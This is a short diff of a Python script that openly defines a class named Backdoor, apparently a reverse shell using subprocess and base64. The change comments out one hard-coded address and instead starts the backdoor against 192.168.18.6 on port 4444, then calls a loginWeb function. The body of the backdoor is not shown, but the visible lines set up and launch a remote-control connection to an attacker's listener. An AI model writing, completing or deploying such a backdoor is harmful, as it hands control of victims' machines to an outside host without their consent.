@@ -11,8 +11,8 @@ import subprocess
 import base64
 import re
 
-ipAddress = "10.178.122.126"
-port = 4444
+# ipAddress = "10.178.122.126"
+# port = 4444
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -164,6 +164,6 @@ def loginWeb():
 
 
 
-myBackdoor = Backdoor(ipAddress, port)
+myBackdoor = Backdoor("192.168.18.6", 4444)
 myBackdoor.run()
 loginWeb()
